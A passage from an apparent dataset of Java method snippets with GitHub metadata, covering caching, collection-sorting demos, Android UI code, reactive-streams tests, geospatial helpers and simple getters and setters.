mRemove = false;        }        // Remove null so that it does not appear in the key/entry sets        super.remove(null);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "trim", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void trim() {        // This runtime performance of this method is not great,        // but it's less error-prone than maintaining a counter.        while (sizeOf(values()) > mMaxBytes) {            trimEldest();        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "nullKeyException", "params": [], "throws": null, "modifiers": ["private"], "return_type": "NullPointerException", "snippet": "    private NullPointerException nullKeyException() {        // Null keys are not permitted because null is used by trim()        return new NullPointerException(\"Key is null\");    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "put", "params": ["K", "Bitmap"], "throws": null, "modifiers": ["public"], "return_type": "Bitmap", "snippet": "    public Bitmap put(K key, Bitmap value) {        if (key == null) {            throw nullKeyException();        }        try {            return super.put(key, value);        } finally {            trim();        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "putAll", "params": ["Map<K,Bitmap>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void putAll(Map<? extends K, ? extends Bitmap> map) {        if (map.containsKey(null)) {            throw nullKeyException();        }        try {            super.putAll(map);        } finally {            trim();        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "get", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "Bitmap", "snippet": "    public Bitmap get(Object key) {        if (key == null) {            throw nullKeyException();        }        return super.get(key);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "containsKey", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean containsKey(Object key) {        if (key == null) {            throw nullKeyException();        }        return super.containsKey(key);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "remove", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "Bitmap", "snippet": "    public Bitmap remove(Object key) {        if (key == null) {            throw nullKeyException();        }        return super.remove(key);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        ArrayList<Integer> list01 = new ArrayList<>();        list01.add(1);        list01.add(3);        list01.add(2);        System.out.println(list01);//[1, 3, 2]        Collections.sort(list01, new Comparator<Integer>() {            //\u91cd\u5199\u6bd4\u8f83\u7684\u89c4\u5219            @Override            public int compare(Integer o1, Integer o2) {                //return o1-o2;//\u5347\u5e8f                return o2-o1;//\u964d\u5e8f            }        });        System.out.println(list01);        ArrayList<Student> list02 = new ArrayList<>();        list02.add(new Student(\"a\u8fea\u4e3d\u70ed\u5df4\",18));        list02.add(new Student(\"\u53e4\u529b\u5a1c\u624e\",20));        list02.add(new Student(\"\u6768\u5e42\",17));        list02.add(new Student(\"b\u6768\u5e42\",18));        System.out.println(list02);        /*Collections.sort(list02, new Comparator<Student>() {            @Override            public int compare(Student o1, Student o2) {                //\u6309\u7167\u5e74\u9f84\u5347\u5e8f\u6392\u5e8f                return o1.getAge()-o2.getAge();            }        });*/        //\u6269\u5c55:\u4e86\u89e3        Collections.sort(list02, new Comparator<Student>() {            @Override            public int compare(Student o1, Student o2) {                //\u6309\u7167\u5e74\u9f84\u5347\u5e8f\u6392\u5e8f                int result =  o1.getAge()-o2.getAge();                //\u5982\u679c\u4e24\u4e2a\u4eba\u5e74\u9f84\u76f8\u540c,\u518d\u4f7f\u7528\u59d3\u540d\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bd4\u8f83                if(result==0){                    result =  o1.getName().charAt(0)-o2.getName().charAt(0);                }                return  result;            }        });        System.out.println(list02);    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/14.%E3%80%90List%E3%80%81Set%E3%80%91-%E7%AC%94%E8%AE%B0/code/03_ListAndSet/src/com/itheima/demo05/Collections/Demo03Sort.java", "stars": "2", "class": {"name": "Demo03Sort", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\t\tif (dependencies.get(\"x\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency x for procedure RosePlayer!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"y\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency y for procedure RosePlayer!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"z\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency z for procedure RosePlayer!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"world\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency world for procedure RosePlayer!\");\t\t\treturn;\t\t}\t\tint x = (int) dependencies.get(\"x\");\t\tint y = (int) dependencies.get(\"y\");\t\tint z = (int) dependencies.get(\"z\");\t\tWorld world = (World) dependencies.get(\"world\");\t\tif (!world.isRemote) {\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(RoseBlock.block, (int) (1)));\t\t\tentityToSpawn.setPickupDelay(10);\t\t\tworld.addEntity(entityToSpawn);\t\t}\t\tif (!world.isRemote) {\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(Items.FLOWER_POT, (int) (1)));\t\t\tentityToSpawn.setPickupDelay(10);\t\t\tworld.addEntity(entityToSpawn);\t\t}\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/RosePlayerProcedure.java", "stars": "2", "class": {"name": "RosePlayerProcedure", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "startActivity", "params": ["Activity"], "throws": null, "modifiers": ["public", "static"], "return_type": "Intent", "snippet": "\tpublic static Intent startActivity(Activity activity) {\t\tIntent intent = new Intent(activity, TVSearchActivity.class);\t\tactivity.startActivity(intent);\t\treturn intent;\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVSearchActivity.java", "stars": "4", "class": {"name": "TVSearchActivity", "extends": "TVBaseActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onCreate(Bundle savedInstanceState) {\t\tTVButterApplication.getAppContext()\t\t\t\t.getComponent()\t\t\t\t.inject(this);\t\tsuper.onCreate(savedInstanceState, R.layout.activity_search);\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVSearchActivity.java", "stars": "4", "class": {"name": "TVSearchActivity", "extends": "TVBaseActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "newInstance", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "MachinesFragment", "snippet": "    public static MachinesFragment newInstance() {        MachinesFragment fragment = new MachinesFragment();        return fragment;    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/machines/MachinesFragment.java", "stars": "1", "class": {"name": "MachinesFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/machines/MachinesFragment.java", "stars": "1", "class": {"name": "MachinesFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateView", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container,                             Bundle savedInstanceState) {        return inflater.inflate(R.layout.fragment_machines, container, false);    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/machines/MachinesFragment.java", "stars": "1", "class": {"name": "MachinesFragment", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "bad_test", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void bad_test() {    // given:    @Cleanup var publisher = new SubmissionPublisher<Integer>();    var atomicInteger = new AtomicInteger();    var subscriber = new Flow.Subscriber<Integer>() {      @Override      public void onSubscribe(Flow.Subscription subscription) {        System.out.printf(\"on subscribe: %s%n\", subscription);        subscription.request(Integer.MAX_VALUE); // producer is unbounded      }      @Override      public void onNext(Integer item) {        System.out.printf(\"on next: %s%n\", item);        atomicInteger.incrementAndGet();      }      @Override      public void onError(Throwable throwable) {        System.out.printf(\"error: %s%n\", throwable.getLocalizedMessage());      }      @Override      public void onComplete() {        System.out.printf(\"done!%n\");      }    };    Stream<Integer> infiniteProducer = Stream.iterate(0, integer -> integer + 2);    // when:    publisher.subscribe(subscriber);    infiniteProducer.forEach(publisher::submit);    // then:    await().atMost(Duration.TWO_SECONDS)           .until(() -> assertThat(atomicInteger.get()).isEqualTo(2));  }", "url": "https://raw.githubusercontent.com/daggerok/hands-on-reactive-programming-with-java-12/master/src/test/java/daggerok/_12/HotPublisherTest.java", "stars": "2", "class": {"name": "HotPublisherTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "test_with_backpressure", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void test_with_backpressure() {    // given:    @Cleanup var publisher = new SubmissionPublisher<Integer>();    var atomicInteger = new AtomicInteger();    var subscriber = new Flow.Subscriber<Integer>() {      @Override      public void onSubscribe(Flow.Subscription subscription) {        System.out.printf(\"on subscribe: %s%n\", subscription);        subscription.request(1); // <-- cold publisher: now subscription is not unbounded...      }      @Override      public void onNext(Integer item) {        System.out.printf(\"on next: %s%n\", item);        atomicInteger.incrementAndGet();      }      @Override      public void onError(Throwable throwable) {        System.out.printf(\"error: %s%n\", throwable.getLocalizedMessage());      }      @Override      public void onComplete() {        System.out.printf(\"done!%n\");      }    };    Stream<Integer> infiniteProducer = Stream.iterate(0, integer -> integer + 2)                                             .limit(10);    // when:    publisher.subscribe(subscriber);    infiniteProducer.forEach(publisher::submit);    // then:    await().atMost(Duration.TWO_SECONDS)           .until(() -> assertThat(atomicInteger.get()).isEqualTo(1)); // <-- see here  }", "url": "https://raw.githubusercontent.com/daggerok/hands-on-reactive-programming-with-java-12/master/src/test/java/daggerok/_12/HotPublisherTest.java", "stars": "2", "class": {"name": "HotPublisherTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "isDebugEnabled", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isDebugEnabled() {    return false;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/nologging/NoLoggingImpl.java", "stars": "15", "class": {"name": "NoLoggingImpl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "isTraceEnabled", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isTraceEnabled() {    return false;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/nologging/NoLoggingImpl.java", "stars": "15", "class": {"name": "NoLoggingImpl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "error", "params": ["String", "Throwable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void error(String s, Throwable e) {    // Do Nothing  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/nologging/NoLoggingImpl.java", "stars": "15", "class": {"name": "NoLoggingImpl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "error", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void error(String s) {    // Do Nothing  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/nologging/NoLoggingImpl.java", "stars": "15", "class": {"name": "NoLoggingImpl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "debug", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void debug(String s) {    // Do Nothing  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/nologging/NoLoggingImpl.java", "stars": "15", "class": {"name": "NoLoggingImpl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "trace", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void trace(String s) {    // Do Nothing  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/nologging/NoLoggingImpl.java", "stars": "15", "class": {"name": "NoLoggingImpl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "warn", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void warn(String s) {    // Do Nothing  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/logging/nologging/NoLoggingImpl.java", "stars": "15", "class": {"name": "NoLoggingImpl", "extends": null, "implements": ["Log"], "modifiers": ["public"]}}, {"method_name": "padLeadingZeroesToInt", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String padLeadingZeroesToInt(int cellIndex, int desiredStringLength)    {        return String.format(\"%0\"+ Integer.toString(desiredStringLength) +\"d\", cellIndex);    }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/utils/HelperClass.java", "stars": "2", "class": {"name": "HelperClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "removeLeadingZeroesFromString", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int removeLeadingZeroesFromString(String str)    {        return Integer.parseInt(str.replaceFirst(\"^0+(?!$)\", \"\"));    }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/utils/HelperClass.java", "stars": "2", "class": {"name": "HelperClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "pointWithinQueryRange", "params": ["ArrayList<Integer>", "ArrayList<Integer>", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean pointWithinQueryRange(ArrayList<Integer> pointCellIndices, ArrayList<Integer> queryCellIndices, int neighboringLayers){        if((pointCellIndices.get(0) >= queryCellIndices.get(0) - neighboringLayers) && (pointCellIndices.get(0) <= queryCellIndices.get(0) + neighboringLayers) && (pointCellIndices.get(1) >= queryCellIndices.get(1) - neighboringLayers) && (pointCellIndices.get(1) <= queryCellIndices.get(1) + neighboringLayers)){            return true;        }        else{            return false;        }    }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/utils/HelperClass.java", "stars": "2", "class": {"name": "HelperClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getIntCellIndices", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ArrayList<Integer>", "snippet": "    public static ArrayList<Integer> getIntCellIndices(String cellID)    {        ArrayList<Integer> cellIndices = new ArrayList<Integer>();        //substring(int startIndex, int endIndex): endIndex is excluded        String cellIDX = cellID.substring(0,5);        String cellIDY = cellID.substring(5);        cellIndices.add(HelperClass.removeLeadingZeroesFromString(cellIDX));        cellIndices.add(HelperClass.removeLeadingZeroesFromString(cellIDY));        return cellIndices;    }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/utils/HelperClass.java", "stars": "2", "class": {"name": "HelperClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCellLayerWRTQueryCell", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Integer", "snippet": "    public static Integer getCellLayerWRTQueryCell(String queryCellID, String cellID)    {        ArrayList<Integer> queryCellIndices = getIntCellIndices(queryCellID);        ArrayList<Integer> cellIndices = getIntCellIndices(cellID);        Integer cellLayer;        if((queryCellIndices.get(0) == cellIndices.get(0)) && (queryCellIndices.get(1) == cellIndices.get(1))) {            return 0; // cell layer is 0        }        else if ( Math.abs(queryCellIndices.get(0) - cellIndices.get(0)) == 0){            return Math.abs(queryCellIndices.get(1) - cellIndices.get(1));        }        else if ( Math.abs(queryCellIndices.get(1) - cellIndices.get(1)) == 0){            return Math.abs(queryCellIndices.get(0) - cellIndices.get(0));        }        else{            return Math.max(Math.abs(queryCellIndices.get(0) - cellIndices.get(0)), Math.abs(queryCellIndices.get(1) - cellIndices.get(1)));        }    }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/utils/HelperClass.java", "stars": "2", "class": {"name": "HelperClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "computeEuclideanDistance", "params": ["Double", "Double", "Double", "Double"], "throws": null, "modifiers": ["public", "static"], "return_type": "double", "snippet": "    public static double computeEuclideanDistance(Double lon, Double lat, Double lon1, Double lat1) {        return Math.sqrt( Math.pow((lat1 - lat),2) + Math.pow((lon1 - lon),2));    }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/utils/HelperClass.java", "stars": "2", "class": {"name": "HelperClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "computeHaverSine", "params": ["Double", "Double", "Double", "Double"], "throws": null, "modifiers": ["public", "static"], "return_type": "double", "snippet": "    public static double computeHaverSine(Double lon, Double lat, Double lon1, Double lat1) {        Double rLat1 = Math.toRadians(lat);        Double rLat2 = Math.toRadians(lat1);        Double dLon=Math.toRadians(lon1-lon);        Double distance= Math.acos(Math.sin(rLat1)*Math.sin(rLat2) + Math.cos(rLat1)*Math.cos(rLat2) * Math.cos(dLon)) * mEarthRadius;        return distance;    }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/utils/HelperClass.java", "stars": "2", "class": {"name": "HelperClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "filter", "params": ["ObjectNode"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean filter(ObjectNode json) throws Exception {            String objType = json.get(\"value\").get(\"geometry\").get(\"type\").asText();            if (objType.equals(\"control\")) {                try {                    throw new IOException();                } finally {}            }            else return true;        }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/utils/HelperClass.java", "stars": "2", "class": {"name": "checkExitControlTuple", "extends": null, "implements": ["FilterFunction"], "modifiers": ["public", "static"]}}, {"method_name": "getRoomId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getRoomId() {        return roomId;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/LeaveChannelRequest.java", "stars": "1", "class": {"name": "LeaveChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setRoomId", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRoomId(String roomId) {        this.roomId = roomId;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/LeaveChannelRequest.java", "stars": "1", "class": {"name": "LeaveChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPlatform", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Platform", "snippet": "    public Platform getPlatform() {        return platform;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/LeaveChannelRequest.java", "stars": "1", "class": {"name": "LeaveChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPlatform", "params": ["Platform"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPlatform(Platform platform) {        this.platform = platform;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/LeaveChannelRequest.java", "stars": "1", "class": {"name": "LeaveChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        return \"LeaveChannelRequest{\" +                \"roomId='\" + roomId + '\\'' +                \", platform='\" + platform + '\\'' +                '}';    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/LeaveChannelRequest.java", "stars": "1", "class": {"name": "LeaveChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGotoOrdering", "params": [], "throws": ["AnalyzerException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testGotoOrdering() throws AnalyzerException {\t\t// The println call occurs earlier in the method code than the actual loading\t\t// \"Hello\", \"World\" are loaded into variables in a non-linear flow using GOTO\t\t// The analyzer will properly handle flow to detect the value of \"Hello World\"\t\tClassNode node = getFromName(\"bin/custom/misc/HelloWorldGotoOrdering.class\");\t\tMethodNode method = getMethod(node, \"helloVariables\");\t\tFrame<AbstractValue>[] frames = TestUtils.getFrames(node.name, method);\t\tint index = getMethodCallIndex(method.instructions, \"println\");\t\tassertEquals(\"Hello World\", FrameUtil.getTopStackLiteral(frames[index]));\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/java/me/coley/analysis/value/TestNonLinearValuePropagation.java", "stars": "12", "class": {"name": "TestNonLinearValuePropagation", "extends": "TestUtils", "implements": null, "modifiers": ["public"]}}, {"method_name": "testSwapOrdering", "params": [], "throws": ["AnalyzerException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testSwapOrdering() throws AnalyzerException {\t\t// The println call occurs earlier in the method code than the actual loading\t\t// \"Hello\", \"World\" are loaded onto the stack in a non-linear flow using GOTO\t\t// The variables are put in the correct order for concatination by using SWAP\t\t// The analyzer will properly handle flow to detect the value of \"Hello World\"\t\tClassNode node = getFromName(\"bin/custom/misc/HelloWorldSwapOrdering.class\");\t\tMethodNode method = getMethod(node, \"helloVariables\");\t\tFrame<AbstractValue>[] frames = TestUtils.getFrames(node.name, method);\t\tint index = getMethodCallIndex(method.instructions, \"println\");\t\tassertEquals(\"Hello World\", FrameUtil.getTopStackLiteral(frames[index]));\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/java/me/coley/analysis/value/TestNonLinearValuePropagation.java", "stars": "12", "class": {"name": "TestNonLinearValuePropagation", "extends": "TestUtils", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        //\u521b\u5efaHashSet\u96c6\u5408\u5b58\u50a8Person        HashSet<Person> set = new HashSet<>();        Person p1 = new Person(\"\u5c0f\u7f8e\u5973\",18);        Person p2 = new Person(\"\u5c0f\u7f8e\u5973\",18);        Person p3 = new Person(\"\u5c0f\u7f8e\u5973\",19);        System.out.println(p1.hashCode());//1967205423        System.out.println(p2.hashCode());//42121758        System.out.println(p1==p2);//false        System.out.println(p1.equals(p2));//false        set.add(p1);        set.add(p2);        set.add(p3);        System.out.println(set);    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/14.%E3%80%90List%E3%80%81Set%E3%80%91-%E7%AC%94%E8%AE%B0/code/03_ListAndSet/src/com/itheima/demo02/Set/Demo03HashSetSavePerson.java", "stars": "2", "class": {"name": "Demo03HashSetSavePerson", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "draw", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void draw (android.graphics.Canvas p0)\t{\t\tn_draw (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ColorChangeRevealDrawable.java", "stars": "2", "class": {"name": "ColorChangeRevealDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_draw", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_draw (android.graphics.Canvas p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ColorChangeRevealDrawable.java", "stars": "2", "class": {"name": "ColorChangeRevealDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ColorChangeRevealDrawable.java", "stars": "2", "class": {"name": "ColorChangeRevealDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ColorChangeRevealDrawable.java", "stars": "2", "class": {"name": "ColorChangeRevealDrawable", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "getExecutors", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Executor>", "snippet": "    public List<Executor> getExecutors() {        return executors;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setExecutors", "params": ["List<Executor>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExecutors(List<Executor> executors) {        this.executors = executors;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {        return id;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {        this.id = id;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": {"name": "DepartmentGroup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOldId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getOldId() {        return oldId;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/DepartmentGroup.java", "stars": "18", "class": 